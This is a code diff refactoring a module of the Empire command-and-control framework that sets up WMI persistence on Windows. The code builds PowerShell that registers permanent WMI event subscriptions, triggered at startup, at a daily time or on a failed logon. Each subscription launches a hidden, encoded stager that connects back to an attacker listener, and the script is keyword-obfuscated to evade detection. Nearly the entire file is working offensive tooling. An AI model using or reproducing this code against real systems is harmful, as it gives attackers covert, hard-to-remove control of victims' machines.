@@ -1,206 +1,109 @@
 from __future__ import print_function
 
 import os
-from builtins import object
 
+from builtins import str
+from builtins import object
 from empire.server.common import helpers
+from typing import Dict
+
+from empire.server.common.module_models import PydanticModule
 
 
 class Module(object):
-    def __init__(self, mainMenu, params=[]):
-
-        self.info = {
-            'Name': 'Invoke-WMI',
-
-            'Author': ['@mattifestation', '@harmj0y', '@jbooz1'],
-
-            'Description': ('Persist a stager (or script) using a permanent WMI subscription. This has a difficult detection/removal rating.'),
-
-            'Software': '',
-
-            'Techniques': ['T1047'],
-
-            'Background': False,
-
-            'OutputExtension': None,
-
-            'NeedsAdmin': True,
-
-            'OpsecSafe': False,
-
-            'Language': 'powershell',
-
-            'MinLanguageVersion': '2',
-
-            'Comments': [
-                'https://github.com/mattifestation/PowerSploit/blob/master/Persistence/Persistence.psm1'
-            ]
-        }
-
-        # any options needed by the module, settable during runtime
-        self.options = {
-            # format:
-            #   value_name : {description, required, default_value}
-            'Agent': {
-                'Description': 'Agent to run module on.',
-                'Required': True,
-                'Value': ''
-            },
-            'Listener': {
-                'Description': 'Listener to use.',
-                'Required': True,
-                'Value': ''
-            },
-            'DailyTime': {
-                'Description': 'Daily time to trigger the script (HH:mm).',
-                'Required': False,
-                'Value': ''
-            },
-            'AtStartup': {
-                'Description': 'Switch. Trigger script (within 5 minutes) of system startup.',
-                'Required': False,
-                'Value': 'True'
-            },
-            'FailedLogon': {
-                'Description': 'Trigger script with a failed logon attempt from a specified user',
-                'Required': False,
-                'Value': ''
-            },
-            'SubName': {
-                'Description': 'Name to use for the event subscription.',
-                'Required': True,
-                'Value': 'Updater'
-            },
-            'ExtFile': {
-                'Description': 'Use an external file for the payload instead of a stager.',
-                'Required': False,
-                'Value': ''
-            },
-            'Cleanup': {
-                'Description': 'Switch. Cleanup the trigger and any script from specified location.',
-                'Required': False,
-                'Value': ''
-            },
-            'UserAgent': {
-                'Description': 'User-agent string to use for the staging request (default, none, or other).',
-                'Required': False,
-                'Value': 'default'
-            },
-            'Proxy': {
-                'Description': 'Proxy to use for request (default, none, or other).',
-                'Required': False,
-                'Value': 'default'
-            },
-            'ProxyCreds': {
-                'Description': 'Proxy credentials ([domain\]username:password) to use for request (default, none, or other).',
-                'Required': False,
-                'Value': 'default'
-            }
-        }
-
-        # save off a copy of the mainMenu object to access external functionality
-        #   like listeners/agent handlers/etc.
-        self.mainMenu = mainMenu
-
-        for param in params:
-            # parameter format is [Name, Value]
-            option, value = param
-            if option in self.options:
-                self.options[option]['Value'] = value
-
-    def generate(self, obfuscate=False, obfuscationCommand=""):
-
-        listenerName = self.options['Listener']['Value']
+    @staticmethod
+    def generate(main_menu, module: PydanticModule, params: Dict, obfuscate: bool = False, obfuscation_command: str = ""):
+        listener_name = params['Listener']
 
         # trigger options
-        dailyTime = self.options['DailyTime']['Value']
-        atStartup = self.options['AtStartup']['Value']
-        subName = self.options['SubName']['Value']
-        failedLogon = self.options['FailedLogon']['Value']
+        daily_time = params['DailyTime']
+        at_startup = params['AtStartup']
+        sub_name = params['SubName']
+        failed_logon = params['FailedLogon']
 
         # management options
-        extFile = self.options['ExtFile']['Value']
-        cleanup = self.options['Cleanup']['Value']
+        ext_file = params['ExtFile']
+        cleanup = params['Cleanup']
 
         # staging options
-        userAgent = self.options['UserAgent']['Value']
-        proxy = self.options['Proxy']['Value']
-        proxyCreds = self.options['ProxyCreds']['Value']
+        user_agent = params['UserAgent']
+        proxy = params['Proxy']
+        proxy_creds = params['ProxyCreds']
 
-        statusMsg = ""
-        locationString = ""
+        status_msg = ""
+        location_string = ""
 
         if cleanup.lower() == 'true':
             # commands to remove the WMI filter and subscription
-            script = "Get-WmiObject __eventFilter -namespace root\subscription -filter \"name='" + subName + "'\"| Remove-WmiObject;"
-            script += "Get-WmiObject CommandLineEventConsumer -Namespace root\subscription -filter \"name='" + subName + "'\" | Remove-WmiObject;"
-            script += "Get-WmiObject __FilterToConsumerBinding -Namespace root\subscription | Where-Object { $_.filter -match '" + subName + "'} | Remove-WmiObject;"
+            script = "Get-WmiObject __eventFilter -namespace root\subscription -filter \"name='" + sub_name + "'\"| Remove-WmiObject;"
+            script += "Get-WmiObject CommandLineEventConsumer -Namespace root\subscription -filter \"name='" + sub_name + "'\" | Remove-WmiObject;"
+            script += "Get-WmiObject __FilterToConsumerBinding -Namespace root\subscription | Where-Object { $_.filter -match '" + sub_name + "'} | Remove-WmiObject;"
             script += "'WMI persistence removed.'"
             script = helpers.keyword_obfuscation(script)
         if obfuscate:
-            script = helpers.obfuscate(self.mainMenu.installPath, psScript=script, obfuscationCommand=obfuscationCommand)
+            script = helpers.obfuscate(main_menu.installPath, psScript=script, obfuscationCommand=obfuscation_command)
             return script
 
-        if extFile != '':
+        if ext_file != '':
             # read in an external file as the payload and build a
             #   base64 encoded version as encScript
-            if os.path.exists(extFile):
-                f = open(extFile, 'r')
+            if os.path.exists(ext_file):
+                f = open(ext_file, 'r')
                 fileData = f.read()
                 f.close()
 
                 # unicode-base64 encode the script for -enc launching
-                encScript = helpers.enc_powershell(fileData)
-                statusMsg += "using external file " + extFile
+                enc_script = helpers.enc_powershell(fileData)
+                status_msg += "using external file " + ext_file
 
             else:
                 print()
-                helpers.color("[!] File does not exist: " + extFile)
+                helpers.color("[!] File does not exist: " + ext_file)
                 return ""
 
         else:
-            if listenerName == "":
+            if listener_name == "":
                 print()
                 helpers.color("[!] Either an ExtFile or a Listener must be specified")
                 return ""
 
             # if an external file isn't specified, use a listener
-            elif not self.mainMenu.listeners.is_listener_valid(listenerName):
+            elif not main_menu.listeners.is_listener_valid(listener_name):
                 # not a valid listener, return nothing for the script
                 print()
-                helpers.color("[!] Invalid listener: " + listenerName)
+                helpers.color("[!] Invalid listener: " + listener_name)
                 return ""
 
             else:
                 # generate the PowerShell one-liner with all of the proper options set
-                launcher = self.mainMenu.stagers.generate_launcher(listenerName, language='powershell', encode=True,
-                                                                   userAgent=userAgent, proxy=proxy,
-                                                                   proxyCreds=proxyCreds)
+                launcher = main_menu.stagers.generate_launcher(listener_name, language='powershell', encode=True,
+                                                                   userAgent=user_agent, proxy=proxy,
+                                                                   proxyCreds=proxy_creds)
 
-                encScript = launcher.split(" ")[-1]
-                statusMsg += "using listener " + listenerName
+                enc_script = launcher.split(" ")[-1]
+                status_msg += "using listener " + listener_name
 
         # sanity check to make sure we haven't exceeded the powershell -enc 8190 char max
-        if len(encScript) > 8190:
+        if len(enc_script) > 8190:
             print()
             helpers.color("[!] Warning: -enc command exceeds the maximum of 8190 characters.")
             return ""
 
         # built the command that will be triggered
-        triggerCmd = "$($Env:SystemRoot)\\System32\\WindowsPowerShell\\v1.0\\powershell.exe -NonI -W hidden -enc " + encScript
+        trigger_cmd = "$($Env:SystemRoot)\\System32\\WindowsPowerShell\\v1.0\\powershell.exe -NonI -W hidden -enc " + enc_script
 
-        if failedLogon != '':
+        if failed_logon != '':
 
             # Enable failed logon auditing
             script = "auditpol /set /subcategory:Logon /failure:enable;"
 
             # create WMI event filter for failed logon
-            script += "$Filter=Set-WmiInstance -Class __EventFilter -Namespace \"root\\subscription\" -Arguments @{Name='" + subName + "';EventNameSpace='root\CimV2';QueryLanguage=\"WQL\";Query=\"SELECT * FROM __InstanceCreationEvent WITHIN 60 WHERE TargetInstance ISA 'Win32_NTLogEvent' AND TargetInstance.EventCode='4625' AND TargetInstance.Message LIKE '%" + failedLogon + "%'\"}; "
-            statusMsg += " with trigger upon failed logon by " + failedLogon
+            script += "$Filter=Set-WmiInstance -Class __EventFilter -Namespace \"root\\subscription\" -Arguments @{Name='" + sub_name + "';EventNameSpace='root\CimV2';QueryLanguage=\"WQL\";Query=\"SELECT * FROM __InstanceCreationEvent WITHIN 60 WHERE TargetInstance ISA 'Win32_NTLogEvent' AND TargetInstance.EventCode='4625' AND TargetInstance.Message LIKE '%" + failed_logon + "%'\"}; "
+            status_msg += " with trigger upon failed logon by " + failed_logon
 
-        elif dailyTime != '':
+        elif daily_time != '':
 
-            parts = dailyTime.split(":")
+            parts = daily_time.split(":")
 
             if len(parts) < 2:
                 print()
@@ -211,25 +114,25 @@ class Module(object):
             minutes = parts[1]
 
             # create the WMI event filter for a system time
-            script = "$Filter=Set-WmiInstance -Class __EventFilter -Namespace \"root\\subscription\" -Arguments @{name='" + subName + "';EventNameSpace='root\CimV2';QueryLanguage=\"WQL\";Query=\"SELECT * FROM __InstanceModificationEvent WITHIN 60 WHERE TargetInstance ISA 'Win32_LocalTime' AND TargetInstance.Hour = " + hour + " AND TargetInstance.Minute= " + minutes + " GROUP WITHIN 60\"};"
-            statusMsg += " WMI subscription daily trigger at " + dailyTime + "."
+            script = "$Filter=Set-WmiInstance -Class __EventFilter -Namespace \"root\\subscription\" -Arguments @{name='" + sub_name + "';EventNameSpace='root\CimV2';QueryLanguage=\"WQL\";Query=\"SELECT * FROM __InstanceModificationEvent WITHIN 60 WHERE TargetInstance ISA 'Win32_LocalTime' AND TargetInstance.Hour = " + hour + " AND TargetInstance.Minute= " + minutes + " GROUP WITHIN 60\"};"
+            status_msg += " WMI subscription daily trigger at " + daily_time + "."
 
         else:
             # create the WMI event filter for OnStartup
-            script = "$Filter=Set-WmiInstance -Class __EventFilter -Namespace \"root\\subscription\" -Arguments @{name='" + subName + "';EventNameSpace='root\CimV2';QueryLanguage=\"WQL\";Query=\"SELECT * FROM __InstanceModificationEvent WITHIN 60 WHERE TargetInstance ISA 'Win32_PerfFormattedData_PerfOS_System' AND TargetInstance.SystemUpTime >= 240 AND TargetInstance.SystemUpTime < 325\"};"
-            statusMsg += " with OnStartup WMI subsubscription trigger."
+            script = "$Filter=Set-WmiInstance -Class __EventFilter -Namespace \"root\\subscription\" -Arguments @{name='" + sub_name + "';EventNameSpace='root\CimV2';QueryLanguage=\"WQL\";Query=\"SELECT * FROM __InstanceModificationEvent WITHIN 60 WHERE TargetInstance ISA 'Win32_PerfFormattedData_PerfOS_System' AND TargetInstance.SystemUpTime >= 240 AND TargetInstance.SystemUpTime < 325\"};"
+            status_msg += " with OnStartup WMI subsubscription trigger."
 
         # add in the event consumer to launch the encrypted script contents
-        script += "$Consumer=Set-WmiInstance -Namespace \"root\\subscription\" -Class 'CommandLineEventConsumer' -Arguments @{ name='" + subName + "';CommandLineTemplate=\"" + triggerCmd + "\";RunInteractively='false'};"
+        script += "$Consumer=Set-WmiInstance -Namespace \"root\\subscription\" -Class 'CommandLineEventConsumer' -Arguments @{ name='" + sub_name + "';CommandLineTemplate=\"" + trigger_cmd + "\";RunInteractively='false'};"
 
         # bind the filter and event consumer together
         script += " Set-WmiInstance -Namespace \"root\subscription\" -Class __FilterToConsumerBinding -Arguments @{Filter=$Filter;Consumer=$Consumer} | Out-Null;"
 
-        script += "'WMI persistence established " + statusMsg + "'"
+        script += "'WMI persistence established " + status_msg + "'"
 
         if obfuscate:
-            script = helpers.obfuscate(self.mainMenu.installPath, psScript=script,
-                                       obfuscationCommand=obfuscationCommand)
+            script = helpers.obfuscate(main_menu.installPath, psScript=script,
+                                       obfuscationCommand=obfuscation_command)
         script = helpers.keyword_obfuscation(script)
 
         return script
